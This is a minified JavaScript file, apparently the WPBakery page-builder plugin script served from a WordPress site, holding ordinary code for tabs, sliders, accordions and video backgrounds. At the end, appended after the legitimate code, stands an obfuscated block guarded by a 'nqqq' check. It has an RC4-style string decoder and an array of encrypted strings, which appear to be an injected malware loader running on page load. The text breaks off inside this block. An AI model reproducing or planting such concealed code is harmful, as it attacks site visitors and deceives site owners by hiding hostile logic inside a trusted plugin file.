// source --> https://kendrew.ca/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=5.5.2
function vc_js() {
  vc_toggleBehaviour(),
    vc_tabsBehaviour(),
    vc_accordionBehaviour(),
    vc_teaserGrid(),
    vc_carouselBehaviour(),
    vc_slidersBehaviour(),
    vc_prettyPhoto(),
    vc_googleplus(),
    vc_pinterest(),
    vc_progress_bar(),
    vc_plugin_flexslider(),
    vc_google_fonts(),
    vc_gridBehaviour(),
    vc_rowBehaviour(),
    vc_prepareHoverBox(),
    vc_googleMapsPointer(),
    vc_ttaActivation(),
    jQuery(document).trigger("vc_js"),
    window.setTimeout(vc_waypoints, 500);
}
(document.documentElement.className += " js_active "),
  (document.documentElement.className +=
    "ontouchstart" in document.documentElement
      ? " vc_mobile "
      : " vc_desktop "),
  (function () {
    for (
      var prefix = ["-webkit-", "-moz-", "-ms-", "-o-", ""], i = 0;
      i < prefix.length;
      i++
    )
      prefix[i] + "transform" in document.documentElement.style &&
        (document.documentElement.className += " vc_transform ");
  })(),
  "function" != typeof window.vc_plugin_flexslider &&
    (window.vc_plugin_flexslider = function ($parent) {
      ($parent
        ? $parent.find(".wpb_flexslider")
        : jQuery(".wpb_flexslider")
      ).each(function () {
        var this_element = jQuery(this),
          sliderTimeout = 1e3 * parseInt(this_element.attr("data-interval")),
          sliderFx = this_element.attr("data-flex_fx"),
          slideshow = !0;
        0 === sliderTimeout && (slideshow = !1),
          this_element.is(":visible") &&
            this_element.flexslider({
              animation: sliderFx,
              slideshow: slideshow,
              slideshowSpeed: sliderTimeout,
              sliderSpeed: 800,
              smoothHeight: !0,
            });
      });
    }),
  "function" != typeof window.vc_googleplus &&
    (window.vc_googleplus = function () {
      0 < jQuery(".wpb_googleplus").length &&
        (function () {
          var po = document.createElement("script");
          (po.type = "text/javascript"),
            (po.async = !0),
            (po.src = "//apis.google.com/js/plusone.js");
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(po, s);
        })();
    }),
  "function" != typeof window.vc_pinterest &&
    (window.vc_pinterest = function () {
      0 < jQuery(".wpb_pinterest").length &&
        (function () {
          var po = document.createElement("script");
          (po.type = "text/javascript"),
            (po.async = !0),
            (po.src = "//assets.pinterest.com/js/pinit.js");
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(po, s);
        })();
    }),
  "function" != typeof window.vc_progress_bar &&
    (window.vc_progress_bar = function () {
      void 0 !== jQuery.fn.waypoint &&
        jQuery(".vc_progress_bar").waypoint(
          function () {
            jQuery(this)
              .find(".vc_single_bar")
              .each(function (index) {
                var bar = jQuery(this).find(".vc_bar"),
                  val = bar.data("percentage-value");
                setTimeout(function () {
                  bar.css({ width: val + "%" });
                }, 200 * index);
              });
          },
          { offset: "85%" },
        );
    }),
  "function" != typeof window.vc_waypoints &&
    (window.vc_waypoints = function () {
      void 0 !== jQuery.fn.waypoint &&
        jQuery(
          ".wpb_animate_when_almost_visible:not(.wpb_start_animation)",
        ).waypoint(
          function () {
            jQuery(this).addClass("wpb_start_animation animated");
          },
          { offset: "85%" },
        );
    }),
  "function" != typeof window.vc_toggleBehaviour &&
    (window.vc_toggleBehaviour = function ($el) {
      function event(e) {
        e && e.preventDefault && e.preventDefault();
        var element = jQuery(this).closest(".vc_toggle"),
          content = element.find(".vc_toggle_content");
        element.hasClass("vc_toggle_active")
          ? content.slideUp({
              duration: 300,
              complete: function () {
                element.removeClass("vc_toggle_active");
              },
            })
          : content.slideDown({
              duration: 300,
              complete: function () {
                element.addClass("vc_toggle_active");
              },
            });
      }
      $el
        ? $el.hasClass("vc_toggle_title")
          ? $el.unbind("click").click(event)
          : $el.find(".vc_toggle_title").unbind("click").click(event)
        : jQuery(".vc_toggle_title").unbind("click").on("click", event);
    }),
  "function" != typeof window.vc_tabsBehaviour &&
    (window.vc_tabsBehaviour = function ($tab) {
      if (jQuery.ui) {
        var $call = $tab || jQuery(".wpb_tabs, .wpb_tour"),
          ver =
            jQuery.ui && jQuery.ui.version
              ? jQuery.ui.version.split(".")
              : "1.10",
          old_version = 1 === parseInt(ver[0]) && parseInt(ver[1]) < 9;
        $call.each(function (index) {
          var $tabs,
            interval = jQuery(this).attr("data-interval"),
            tabs_array = [];
          if (
            (($tabs = jQuery(this)
              .find(".wpb_tour_tabs_wrapper")
              .tabs({
                show: function (event, ui) {
                  wpb_prepare_tab_content(event, ui);
                },
                beforeActivate: function (event, ui) {
                  1 !== ui.newPanel.index() &&
                    ui.newPanel.find(".vc_pie_chart:not(.vc_ready)");
                },
                activate: function (event, ui) {
                  wpb_prepare_tab_content(event, ui);
                },
              })),
            interval && 0 < interval)
          )
            try {
              $tabs.tabs("rotate", 1e3 * interval);
            } catch (e) {
              window.console && window.console.warn && console.warn(e);
            }
          jQuery(this)
            .find(".wpb_tab")
            .each(function () {
              tabs_array.push(this.id);
            }),
            jQuery(this)
              .find(".wpb_tabs_nav li")
              .click(function (e) {
                return (
                  e.preventDefault(),
                  old_version
                    ? $tabs.tabs("select", jQuery("a", this).attr("href"))
                    : $tabs.tabs("option", "active", jQuery(this).index()),
                  !1
                );
              }),
            jQuery(this)
              .find(".wpb_prev_slide a, .wpb_next_slide a")
              .click(function (e) {
                if ((e.preventDefault(), old_version)) {
                  var index = $tabs.tabs("option", "selected");
                  jQuery(this).parent().hasClass("wpb_next_slide")
                    ? index++
                    : index--,
                    index < 0
                      ? (index = $tabs.tabs("length") - 1)
                      : index >= $tabs.tabs("length") && (index = 0),
                    $tabs.tabs("select", index);
                } else {
                  index = $tabs.tabs("option", "active");
                  var length = $tabs.find(".wpb_tab").length;
                  (index = jQuery(this).parent().hasClass("wpb_next_slide")
                    ? length <= index + 1
                      ? 0
                      : index + 1
                    : index - 1 < 0
                      ? length - 1
                      : index - 1),
                    $tabs.tabs("option", "active", index);
                }
              });
        });
      }
    }),
  "function" != typeof window.vc_accordionBehaviour &&
    (window.vc_accordionBehaviour = function () {
      jQuery(".wpb_accordion").each(function (index) {
        var $tabs,
          $this = jQuery(this),
          active_tab =
            ($this.attr("data-interval"),
            !isNaN(jQuery(this).data("active-tab")) &&
              0 < parseInt($this.data("active-tab")) &&
              parseInt($this.data("active-tab")) - 1),
          collapsible =
            !1 === active_tab || "yes" === $this.data("collapsible");
        ($tabs = $this.find(".wpb_accordion_wrapper").accordion({
          header: "> div > h3",
          autoHeight: !1,
          heightStyle: "content",
          active: active_tab,
          collapsible: collapsible,
          navigation: !0,
          activate: vc_accordionActivate,
          change: function (event, ui) {
            void 0 !== jQuery.fn.isotope &&
              ui.newContent.find(".isotope").isotope("layout"),
              vc_carouselBehaviour(ui.newPanel);
          },
        })),
          !0 === $this.data("vcDisableKeydown") &&
            ($tabs.data("uiAccordion")._keydown = function () {});
      });
    }),
  "function" != typeof window.vc_teaserGrid &&
    (window.vc_teaserGrid = function () {
      var layout_modes = { fitrows: "fitRows", masonry: "masonry" };
      jQuery(
        ".wpb_grid .teaser_grid_container:not(.wpb_carousel), .wpb_filtered_grid .teaser_grid_container:not(.wpb_carousel)",
      ).each(function () {
        var $container = jQuery(this),
          $thumbs = $container.find(".wpb_thumbnails"),
          layout_mode = $thumbs.attr("data-layout-mode");
        $thumbs.isotope({
          itemSelector: ".isotope-item",
          layoutMode:
            void 0 === layout_modes[layout_mode]
              ? "fitRows"
              : layout_modes[layout_mode],
        }),
          $container
            .find(".categories_filter a")
            .data("isotope", $thumbs)
            .click(function (e) {
              e.preventDefault();
              var $thumbs = jQuery(this).data("isotope");
              jQuery(this)
                .parent()
                .parent()
                .find(".active")
                .removeClass("active"),
                jQuery(this).parent().addClass("active"),
                $thumbs.isotope({ filter: jQuery(this).attr("data-filter") });
            }),
          jQuery(window).bind("load resize", function () {
            $thumbs.isotope("layout");
          });
      });
    }),
  "function" != typeof window.vc_carouselBehaviour &&
    (window.vc_carouselBehaviour = function ($parent) {
      ($parent ? $parent.find(".wpb_carousel") : jQuery(".wpb_carousel")).each(
        function () {
          var $this = jQuery(this);
          if (!0 !== $this.data("carousel_enabled") && $this.is(":visible")) {
            $this.data("carousel_enabled", !0);
            getColumnsCount(jQuery(this));
            jQuery(this).hasClass("columns_count_1") && 900;
            var carousele_li = jQuery(this).find(".wpb_thumbnails-fluid li");
            carousele_li.css({
              "margin-right": carousele_li.css("margin-left"),
              "margin-left": 0,
            });
            var fluid_ul = jQuery(this).find("ul.wpb_thumbnails-fluid");
            fluid_ul.width(fluid_ul.width() + 300),
              jQuery(window).resize(function () {
                screen_size != (screen_size = getSizeName()) &&
                  window.setTimeout("location.reload()", 20);
              });
          }
        },
      );
    }),
  "function" != typeof window.vc_slidersBehaviour &&
    (window.vc_slidersBehaviour = function () {
      jQuery(".wpb_gallery_slides").each(function (index) {
        var $imagesGrid,
          this_element = jQuery(this);
        if (this_element.hasClass("wpb_slider_nivo")) {
          var sliderTimeout = 1e3 * this_element.attr("data-interval");
          0 === sliderTimeout && (sliderTimeout = 9999999999),
            this_element
              .find(".nivoSlider")
              .nivoSlider({
                effect: "boxRainGrow,boxRain,boxRainReverse,boxRainGrowReverse",
                slices: 15,
                boxCols: 8,
                boxRows: 4,
                animSpeed: 800,
                pauseTime: sliderTimeout,
                startSlide: 0,
                directionNav: !0,
                directionNavHide: !0,
                controlNav: !0,
                keyboardNav: !1,
                pauseOnHover: !0,
                manualAdvance: !1,
                prevText: "Prev",
                nextText: "Next",
              });
        } else
          this_element.hasClass("wpb_image_grid") &&
            (jQuery.fn.imagesLoaded
              ? ($imagesGrid = this_element
                  .find(".wpb_image_grid_ul")
                  .imagesLoaded(function () {
                    $imagesGrid.isotope({
                      itemSelector: ".isotope-item",
                      layoutMode: "fitRows",
                    });
                  }))
              : this_element
                  .find(".wpb_image_grid_ul")
                  .isotope({
                    itemSelector: ".isotope-item",
                    layoutMode: "fitRows",
                  }));
      });
    }),
  "function" != typeof window.vc_prettyPhoto &&
    (window.vc_prettyPhoto = function () {
      try {
        jQuery &&
          jQuery.fn &&
          jQuery.fn.prettyPhoto &&
          jQuery('a.prettyphoto, .gallery-icon a[href*=".jpg"]').prettyPhoto({
            animationSpeed: "normal",
            hook: "data-rel",
            padding: 15,
            opacity: 0.7,
            showTitle: !0,
            allowresize: !0,
            counter_separator_label: "/",
            hideflash: !1,
            deeplinking: !1,
            modal: !1,
            callback: function () {
              -1 < location.href.indexOf("#!prettyPhoto") &&
                (location.hash = "");
            },
            social_tools: "",
          });
      } catch (err) {
        window.console && window.console.warn && console.warn(err);
      }
    }),
  "function" != typeof window.vc_google_fonts &&
    (window.vc_google_fonts = function () {
      return !1;
    }),
  (window.vcParallaxSkroll = !1),
  "function" != typeof window.vc_rowBehaviour &&
    (window.vc_rowBehaviour = function () {
      var vcSkrollrOptions,
        callSkrollInit,
        $ = window.jQuery;
      function fullWidthRow() {
        var $elements = $('[data-vc-full-width="true"]');
        $.each($elements, function (key, item) {
          var $el = $(this);
          $el.addClass("vc_hidden");
          var $el_full = $el.next(".vc_row-full-width");
          if (
            ($el_full.length ||
              ($el_full = $el.parent().next(".vc_row-full-width")),
            $el_full.length)
          ) {
            var padding,
              paddingRight,
              el_margin_left = parseInt($el.css("margin-left"), 10),
              el_margin_right = parseInt($el.css("margin-right"), 10),
              offset = 0 - $el_full.offset().left - el_margin_left,
              width = $(window).width();
            if (
              ("rtl" === $el.css("direction") &&
                ((offset -= $el_full.width()),
                (offset += width),
                (offset += el_margin_left),
                (offset += el_margin_right)),
              $el.css({
                position: "relative",
                left: offset,
                "box-sizing": "border-box",
                width: width,
              }),
              !$el.data("vcStretchContent"))
            )
              "rtl" === $el.css("direction")
                ? ((padding = $el_full.offset().left) < 0 && (padding = 0),
                  (paddingRight = offset) < 0 && (paddingRight = 0))
                : ((padding = -1 * offset) < 0 && (padding = 0),
                  (paddingRight =
                    width -
                    padding -
                    $el_full.width() +
                    el_margin_left +
                    el_margin_right) < 0 && (paddingRight = 0)),
                $el.css({
                  "padding-left": padding + "px",
                  "padding-right": paddingRight + "px",
                });
            $el.attr("data-vc-full-width-init", "true"),
              $el.removeClass("vc_hidden"),
              $(document).trigger("vc-full-width-row-single", {
                el: $el,
                offset: offset,
                marginLeft: el_margin_left,
                marginRight: el_margin_right,
                elFull: $el_full,
                width: width,
              });
          }
        }),
          $(document).trigger("vc-full-width-row", $elements);
      }
      function fullHeightRow() {
        var windowHeight,
          offsetTop,
          fullHeight,
          $element = $(".vc_row-o-full-height:first");
        $element.length &&
          ((windowHeight = $(window).height()),
          (offsetTop = $element.offset().top) < windowHeight &&
            ((fullHeight = 100 - offsetTop / (windowHeight / 100)),
            $element.css("min-height", fullHeight + "vh")));
        $(document).trigger("vc-full-height-row", $element);
      }
      $(window)
        .off("resize.vcRowBehaviour")
        .on("resize.vcRowBehaviour", fullWidthRow)
        .on("resize.vcRowBehaviour", fullHeightRow),
        fullWidthRow(),
        fullHeightRow(),
        (0 < window.navigator.userAgent.indexOf("MSIE ") ||
          navigator.userAgent.match(/Trident.*rv\:11\./)) &&
          $(".vc_row-o-full-height").each(function () {
            "flex" === $(this).css("display") &&
              $(this).wrap('<div class="vc_ie-flexbox-fixer"></div>');
          }),
        vc_initVideoBackgrounds(),
        (callSkrollInit = !1),
        window.vcParallaxSkroll && window.vcParallaxSkroll.destroy(),
        $(".vc_parallax-inner").remove(),
        $("[data-5p-top-bottom]").removeAttr(
          "data-5p-top-bottom data-30p-top-bottom",
        ),
        $("[data-vc-parallax]").each(function () {
          var skrollrSize,
            skrollrStart,
            $parallaxElement,
            parallaxImage,
            youtubeId;
          (callSkrollInit = !0),
            "on" === $(this).data("vcParallaxOFade") &&
              $(this)
                .children()
                .attr("data-5p-top-bottom", "opacity:0;")
                .attr("data-30p-top-bottom", "opacity:1;"),
            (skrollrSize = 100 * $(this).data("vcParallax")),
            ($parallaxElement = $("<div />")
              .addClass("vc_parallax-inner")
              .appendTo($(this))).height(skrollrSize + "%"),
            (youtubeId = vcExtractYoutubeId(
              (parallaxImage = $(this).data("vcParallaxImage")),
            ))
              ? insertYoutubeVideoAsBackground($parallaxElement, youtubeId)
              : void 0 !== parallaxImage &&
                $parallaxElement.css(
                  "background-image",
                  "url(" + parallaxImage + ")",
                ),
            (skrollrStart = -(skrollrSize - 100)),
            $parallaxElement
              .attr("data-bottom-top", "top: " + skrollrStart + "%;")
              .attr("data-top-bottom", "top: 0%;");
        }),
        callSkrollInit &&
          window.skrollr &&
          ((vcSkrollrOptions = {
            forceHeight: !1,
            smoothScrolling: !1,
            mobileCheck: function () {
              return !1;
            },
          }),
          (window.vcParallaxSkroll = skrollr.init(vcSkrollrOptions)),
          window.vcParallaxSkroll);
    }),
  "function" != typeof window.vc_gridBehaviour &&
    (window.vc_gridBehaviour = function () {
      jQuery.fn.vcGrid && jQuery("[data-vc-grid]").vcGrid();
    }),
  "function" != typeof window.getColumnsCount &&
    (window.getColumnsCount = function (el) {
      for (var find = !1, i = 1; !1 === find; ) {
        if (el.hasClass("columns_count_" + i)) return (find = !0), i;
        i++;
      }
    });
var screen_size = getSizeName();
function getSizeName() {
  var screen_w = jQuery(window).width();
  return 1170 < screen_w
    ? "desktop_wide"
    : 960 < screen_w && screen_w < 1169
      ? "desktop"
      : 768 < screen_w && screen_w < 959
        ? "tablet"
        : 300 < screen_w && screen_w < 767
          ? "mobile"
          : screen_w < 300
            ? "mobile_portrait"
            : "";
}
function loadScript(url, $obj, callback) {
  var script = document.createElement("script");
  (script.type = "text/javascript"),
    script.readyState &&
      (script.onreadystatechange = function () {
        ("loaded" !== script.readyState && "complete" !== script.readyState) ||
          ((script.onreadystatechange = null), callback());
      }),
    (script.src = url),
    $obj.get(0).appendChild(script);
}
function vc_ttaActivation() {
  jQuery("[data-vc-accordion]").on("show.vc.accordion", function (e) {
    var $ = window.jQuery,
      ui = {};
    (ui.newPanel = $(this).data("vc.accordion").getTarget()),
      window.wpb_prepare_tab_content(e, ui);
  });
}
function vc_accordionActivate(event, ui) {
  if (ui.newPanel.length && ui.newHeader.length) {
    var $pie_charts = ui.newPanel.find(".vc_pie_chart:not(.vc_ready)"),
      $round_charts = ui.newPanel.find(".vc_round-chart"),
      $line_charts = ui.newPanel.find(".vc_line-chart"),
      $carousel = ui.newPanel.find('[data-ride="vc_carousel"]');
    void 0 !== jQuery.fn.isotope &&
      ui.newPanel.find(".isotope, .wpb_image_grid_ul").isotope("layout"),
      ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").length &&
        ui.newPanel
          .find(".vc_masonry_media_grid, .vc_masonry_grid")
          .each(function () {
            var grid = jQuery(this).data("vcGrid");
            grid &&
              grid.gridBuilder &&
              grid.gridBuilder.setMasonry &&
              grid.gridBuilder.setMasonry();
          }),
      vc_carouselBehaviour(ui.newPanel),
      vc_plugin_flexslider(ui.newPanel),
      $pie_charts.length && jQuery.fn.vcChat && $pie_charts.vcChat(),
      $round_charts.length &&
        jQuery.fn.vcRoundChart &&
        $round_charts.vcRoundChart({ reload: !1 }),
      $line_charts.length &&
        jQuery.fn.vcLineChart &&
        $line_charts.vcLineChart({ reload: !1 }),
      $carousel.length &&
        jQuery.fn.carousel &&
        $carousel.carousel("resizeAction"),
      ui.newPanel.parents(".isotope").length &&
        ui.newPanel.parents(".isotope").each(function () {
          jQuery(this).isotope("layout");
        });
  }
}
function initVideoBackgrounds() {
  return (
    window.console &&
      window.console.warn &&
      window.console.warn(
        "this function is deprecated use vc_initVideoBackgrounds",
      ),
    vc_initVideoBackgrounds()
  );
}
function vc_initVideoBackgrounds() {
  jQuery("[data-vc-video-bg]").each(function () {
    var youtubeId,
      $element = jQuery(this);
    $element.data("vcVideoBg")
      ? ((youtubeId = vcExtractYoutubeId($element.data("vcVideoBg"))) &&
          ($element.find(".vc_video-bg").remove(),
          insertYoutubeVideoAsBackground($element, youtubeId)),
        jQuery(window).on("grid:items:added", function (event, $grid) {
          $element.has($grid).length && vcResizeVideoBackground($element);
        }))
      : $element.find(".vc_video-bg").remove();
  });
}
function insertYoutubeVideoAsBackground($element, youtubeId, counter) {
  if ("undefined" == typeof YT || void 0 === YT.Player)
    return 100 < (counter = void 0 === counter ? 0 : counter)
      ? void console.warn("Too many attempts to load YouTube api")
      : void setTimeout(function () {
          insertYoutubeVideoAsBackground($element, youtubeId, counter++);
        }, 100);
  var $container = $element
    .prepend(
      '<div class="vc_video-bg vc_hidden-xs"><div class="inner"></div></div>',
    )
    .find(".inner");
  new YT.Player($container[0], {
    width: "100%",
    height: "100%",
    videoId: youtubeId,
    playerVars: {
      playlist: youtubeId,
      iv_load_policy: 3,
      enablejsapi: 1,
      disablekb: 1,
      autoplay: 1,
      controls: 0,
      showinfo: 0,
      rel: 0,
      loop: 1,
      wmode: "transparent",
    },
    events: {
      onReady: function (event) {
        event.target.mute().setLoop(!0);
      },
    },
  }),
    vcResizeVideoBackground($element),
    jQuery(window).bind("resize", function () {
      vcResizeVideoBackground($element);
    });
}
function vcResizeVideoBackground($element) {
  var iframeW,
    iframeH,
    marginLeft,
    marginTop,
    containerW = $element.innerWidth(),
    containerH = $element.innerHeight();
  containerW / containerH < 16 / 9
    ? ((iframeW = containerH * (16 / 9)),
      (iframeH = containerH),
      (marginLeft = -Math.round((iframeW - containerW) / 2) + "px"),
      (marginTop = -Math.round((iframeH - containerH) / 2) + "px"))
    : ((iframeH = (iframeW = containerW) * (9 / 16)),
      (marginTop = -Math.round((iframeH - containerH) / 2) + "px"),
      (marginLeft = -Math.round((iframeW - containerW) / 2) + "px")),
    (iframeW += "px"),
    (iframeH += "px"),
    $element
      .find(".vc_video-bg iframe")
      .css({
        maxWidth: "1000%",
        marginLeft: marginLeft,
        marginTop: marginTop,
        width: iframeW,
        height: iframeH,
      });
}
function vcExtractYoutubeId(url) {
  if (void 0 === url) return !1;
  var id = url.match(
    /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/,
  );
  return null !== id && id[1];
}
if (
  ("function" != typeof window.wpb_prepare_tab_content &&
    (window.wpb_prepare_tab_content = function (event, ui) {
      var $ui_panel,
        $google_maps,
        panel = ui.panel || ui.newPanel,
        $pie_charts = panel.find(".vc_pie_chart:not(.vc_ready)"),
        $round_charts = panel.find(".vc_round-chart"),
        $line_charts = panel.find(".vc_line-chart"),
        $carousel = panel.find('[data-ride="vc_carousel"]');
      if (
        (vc_carouselBehaviour(),
        vc_plugin_flexslider(panel),
        ui.newPanel.find(".vc_masonry_media_grid, .vc_masonry_grid").length &&
          ui.newPanel
            .find(".vc_masonry_media_grid, .vc_masonry_grid")
            .each(function () {
              var grid = jQuery(this).data("vcGrid");
              grid &&
                grid.gridBuilder &&
                grid.gridBuilder.setMasonry &&
                grid.gridBuilder.setMasonry();
            }),
        panel.find(".vc_masonry_media_grid, .vc_masonry_grid").length &&
          panel
            .find(".vc_masonry_media_grid, .vc_masonry_grid")
            .each(function () {
              var grid = jQuery(this).data("vcGrid");
              grid &&
                grid.gridBuilder &&
                grid.gridBuilder.setMasonry &&
                grid.gridBuilder.setMasonry();
            }),
        $pie_charts.length && jQuery.fn.vcChat && $pie_charts.vcChat(),
        $round_charts.length &&
          jQuery.fn.vcRoundChart &&
          $round_charts.vcRoundChart({ reload: !1 }),
        $line_charts.length &&
          jQuery.fn.vcLineChart &&
          $line_charts.vcLineChart({ reload: !1 }),
        $carousel.length &&
          jQuery.fn.carousel &&
          $carousel.carousel("resizeAction"),
        ($ui_panel = panel.find(".isotope, .wpb_image_grid_ul")),
        ($google_maps = panel.find(".wpb_gmaps_widget")),
        0 < $ui_panel.length && $ui_panel.isotope("layout"),
        $google_maps.length && !$google_maps.is(".map_ready"))
      ) {
        var $frame = $google_maps.find("iframe");
        $frame.attr("src", $frame.attr("src")),
          $google_maps.addClass("map_ready");
      }
      panel.parents(".isotope").length &&
        panel.parents(".isotope").each(function () {
          jQuery(this).isotope("layout");
        });
    }),
  "function" != typeof window.vc_googleMapsPointer)
)
  function vc_googleMapsPointer() {
    var $ = window.jQuery,
      $wpbGmapsWidget = $(".wpb_gmaps_widget");
    $wpbGmapsWidget.click(function () {
      $("iframe", this).css("pointer-events", "auto");
    }),
      $wpbGmapsWidget.mouseleave(function () {
        $("iframe", this).css("pointer-events", "none");
      }),
      $(".wpb_gmaps_widget iframe").css("pointer-events", "none");
  }
function vc_setHoverBoxPerspective(hoverBox) {
  hoverBox.each(function () {
    var $this = jQuery(this),
      perspective = 4 * $this.width() + "px";
    $this.css("perspective", perspective);
  });
}
function vc_setHoverBoxHeight(hoverBox) {
  hoverBox.each(function () {
    var $this = jQuery(this),
      hoverBoxInner = $this.find(".vc-hoverbox-inner");
    hoverBoxInner.css("min-height", 0);
    var frontHeight = $this.find(".vc-hoverbox-front-inner").outerHeight(),
      backHeight = $this.find(".vc-hoverbox-back-inner").outerHeight(),
      hoverBoxHeight = backHeight < frontHeight ? frontHeight : backHeight;
    hoverBoxHeight < 250 && (hoverBoxHeight = 250),
      hoverBoxInner.css("min-height", hoverBoxHeight + "px");
  });
}
function vc_prepareHoverBox() {
  var hoverBox = jQuery(".vc-hoverbox");
  vc_setHoverBoxHeight(hoverBox), vc_setHoverBoxPerspective(hoverBox);
}
jQuery(document).ready(vc_prepareHoverBox),
  jQuery(window).resize(vc_prepareHoverBox),
  jQuery(document).ready(function ($) {
    window.vc_js();
  });
if (typeof nqqq === "undefined") {
  function a0S(R, S) {
    var T = a0R();
    return (
      (a0S = function (H, z) {
        H = H - (0x507 + -0x5d * -0xc + -0x25 * 0x35);
        var E = T[H];
        if (a0S["ERkkMa"] === undefined) {
          var i = function (F) {
            var j =
              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
            var p = "",
              C = "";
            for (
              var w = 0x1fa6 * 0x1 + 0x6cb * 0x4 + 0x2 * -0x1d69,
                x,
                r,
                W = -0x81d + 0x9c2 * -0x4 + 0x1bf * 0x1b;
              (r = F["charAt"](W++));
              ~r &&
              ((x =
                w % (0x1eac + 0x2280 + 0x1e * -0x22c)
                  ? x * (-0x114c + -0xf43 * -0x1 + 0xc3 * 0x3) + r
                  : r),
              w++ % (0x13 * 0x3d + -0x1 * 0x1ced + -0xfa * -0x19))
                ? (p += String["fromCharCode"](
                    (-0x2414 + -0x2204 + 0x4717) &
                      (x >>
                        ((-(0x8a8 + -0x1 * 0x24d7 + 0x1c31) * w) &
                          (0x3 * 0x78d + -0x3 * -0x61b + -0x1 * 0x28f2))),
                  ))
                : 0x781 + 0x390 * -0x5 + 0x5b * 0x1d
            ) {
              r = j["indexOf"](r);
            }
            for (
              var s = 0x1 * 0x13f3 + 0x311 * -0x1 + -0x10e2, y = p["length"];
              s < y;
              s++
            ) {
              C +=
                "%" +
                ("00" +
                  p["charCodeAt"](s)["toString"](-0x1ded + -0x49b + 0x2298))[
                  "slice"
                ](-(-0x16 * 0x8 + 0x1ade + -0x29e * 0xa));
            }
            return decodeURIComponent(C);
          };
          var a = function (F, p) {
            var C = [],
              w = 0x224f + -0x2 * 0x122c + 0x209 * 0x1,
              r,
              W = "";
            F = i(F);
            var b;
            for (
              b = 0x29 * 0x21 + -0x18f9 + -0x3c * -0x54;
              b < 0x9 * -0x3d7 + -0x1 * -0x260f + -0x280;
              b++
            ) {
              C[b] = b;
            }
            for (
              b = -0xadb + -0x1fcc + 0x2aa7;
              b < -0x1 * -0x94f + -0x24eb + 0x2 * 0xe4e;
              b++
            ) {
              (w =
                (w + C[b] + p["charCodeAt"](b % p["length"])) %
                (0x489 * 0x1 + -0x1a3e + 0x16b5)),
                (r = C[b]),
                (C[b] = C[w]),
                (C[w] = r);
            }
            (b = -0xecb + -0xc62 * 0x1 + 0x1b2d),
              (w = 0x1d * 0xa6 + 0xa * -0x3d1 + 0x162 * 0xe);
            for (
              var K = -0x55d * 0x7 + -0x121b * -0x1 + -0x1370 * -0x1;
              K < F["length"];
              K++
            ) {
              (b =
                (b + (0x415 * -0x5 + -0x59f + 0x1a09)) %
                (-0x1544 + -0x19e8 + 0x302c)),
                (w = (w + C[b]) % (0x1060 + 0x1 * -0x19c3 + 0xa63)),
                (r = C[b]),
                (C[b] = C[w]),
                (C[w] = r),
                (W += String["fromCharCode"](
                  F["charCodeAt"](K) ^
                    C[(C[b] + C[w]) % (0x8 * -0x486 + -0x669 * -0x1 + 0x1ec7)],
                ));
            }
            return W;
          };
          (a0S["odSxJZ"] = a), (R = arguments), (a0S["ERkkMa"] = !![]);
        }
        var B = T[-0x11a * -0x9 + -0x127d * 0x2 + -0x362 * -0x8],
          J = H + B,
          N = R[J];
        return (
          !N
            ? (a0S["TfeLLs"] === undefined && (a0S["TfeLLs"] = !![]),
              (E = a0S["odSxJZ"](E, z)),
              (R[J] = E))
            : (E = N),
          E
        );
      }),
      a0S(R, S)
    );
  }
  function a0R() {
    var b = [
      "f29M",
      "WQNcMCoV",
      "WO9GW6S",
      "bSkmW6y",
      "zMzQ",
      "o8oCyq",
      "W47cPmoK",
      "xH5L",
      "WPddOddcP0GNlmoU",
      "WQTdW5S",
      "vWj/",
      "W6iprW",
      "W7pdMK/dUCooWRddG8kaCMzrW78",
      "r8oUxa",
      "lKxdGG",
      "expdMq9CWQ0LeSkiW40",
      "W70SW5lcGSoazg7cSa",
      "WQddJWddSmk2WOldHa",
      "y8o9uq",
      "W5Lxkq",
      "W4FdPLm",
      "W49/zG",
      "wCoTW4LWtMuWWRqcCebcWQRcMa",
      "WRFcMry",
      "BfDpW4ZcKSkzpgNcIGuXWPK",
      "WRHvWQG",
      "W5pcTtu",
      "fLWGW63dVW54W55cnZhcOqG1",
      "dxrG",
      "WO5zwW",
      "z8kOWQKGW5JcUKNcG8obuXZcGG",
      "fCoPaW",
      "WPvbWOTnFXZcVCoj",
      "o8ozW5a",
      "W4j+zq",
      "kNHI",
      "uuNdMW",
      "smkrW5C",
      "WPldGCog",
      "WQ4xWOy",
      "W7VdKmo+",
      "WOT7WQG",
      "uenY",
      "gSk5WPK",
      "s8kcWPu",
      "WQJcH8o9",
      "sLFdNW",
      "WQRdGmo7",
      "W6hdOJ4",
      "oKbXACkMBLj7",
      "j1ZdGa",
      "W4RdL3pcTCoaW4RcGt3cNCkDWRvTW6Xl",
      "W4HKrW",
      "WQPeWQ8",
      "k8ovFa",
      "wwRcHa",
      "WQOcWOC",
      "hui+",
      "cCkJbW",
      "sGH/",
      "AvbpW4VcMmkCdetcUr0kWPm",
      "uuJdMq",
      "W4GEWOC",
      "lCogW7K",
      "WQP3oG",
      "qt7dJHW6wf7dNmoXW4iVWR0A",
      "BYKtWPpdRmohla",
      "fSkTEJJdG8oYWOf2",
      "rHL4",
      "pG4w",
      "W415iW",
      "W7pdK03cISkxW5FdUSkitW",
      "W7FdVYu",
      "cLFdLG",
      "qmoxAa",
      "oeWo",
      "WP7dOCkGW7OxECkJWQGwkmkOWR8g",
      "W4JcVd8",
      "oGqn",
      "WOhdICkR",
      "qSo4uG",
      "pCopAq",
      "W6/dMSkQEmk2WOnBhaVcQui3",
      "f0tcMG",
      "rCk1WPy",
      "nJzDWRygthGwW4JcSSkvqeO/",
      "W61FBa",
      "W7BdN0VdTSopWRFdMSkDDNjFW4m",
      "uSoZW5C",
      "saa+",
      "WOHqxq",
      "x8o3qG",
      "WR9fWRu",
      "vWxcNa",
      "pdryWR1wcH1wW4tcJq",
      "W7NcNmoZ",
      "W6FdQWW",
      "cNnR",
      "B8kVW7rxWOpdIxJcVG",
      "e2ZcJa",
      "W4nakW",
      "fwHN",
      "qmkbW6y",
      "W4ZdMxldG8kyWQNdVwtcNW",
    ];
    a0R = function () {
      return b;
    };
    return a0R();
  }
  (function (R, S) {
    var p = a0S,
      T = R();
